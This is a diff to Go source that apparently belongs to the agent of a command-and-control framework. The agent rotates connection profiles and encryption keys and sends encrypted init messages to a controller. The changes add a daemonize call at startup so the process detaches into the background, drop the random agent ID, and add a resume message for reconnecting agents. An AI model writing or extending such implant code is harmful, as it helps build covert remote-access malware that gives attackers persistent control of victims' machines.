@@ -4,7 +4,7 @@ import (
 	"crypto/rand"
 	"crypto/tls"
 	"crypto/x509"
-	"encoding/binary"
+	"gopher/daemon"
 	"gopher/functions"
 	"gopher/utils"
 	"net"
@@ -80,10 +80,14 @@ var profiles []utils.Profile
 var encKeys [][]byte
 var profileIndex int
 var profile utils.Profile
-var AgentId uint32
+var AgentId int64
 var encKey []byte
 
 func main() {
+
+	if daemon.Daemonize() {
+		return
+	}
 
 	for _, encProfile := range encProfiles {
 		key := make([]byte, 16)
@@ -115,11 +119,9 @@ func main() {
 	sessionInfo, sessionKey := CreateInfo()
 	utils.SKey = sessionKey
 
-	r := make([]byte, 4)
-	_, _ = rand.Read(r)
-	AgentId = binary.BigEndian.Uint32(r)
+	AgentId = 0
 
-	initData, _ := msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
+	initData, _ := msgpack.Marshal(utils.InitPack{Type: profile.Type, Data: sessionInfo})
 	initMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
 	initMsg, _ = utils.EncryptData(initMsg, encKey)
 
@@ -137,7 +139,11 @@ func main() {
 				profileIndex = (profileIndex + 1) % len(profiles)
 				profile = profiles[profileIndex]
 				encKey = encKeys[profileIndex]
-				initData, _ = msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
+				if AgentId == 0 {
+					initData, _ = msgpack.Marshal(utils.InitPack{Type: profile.Type, Data: sessionInfo})
+				} else {
+					initData, _ = msgpack.Marshal(utils.ResumePack{Id: AgentId})
+				}
 				initMsg, _ = msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
 				initMsg, _ = utils.EncryptData(initMsg, encKey)
 			}
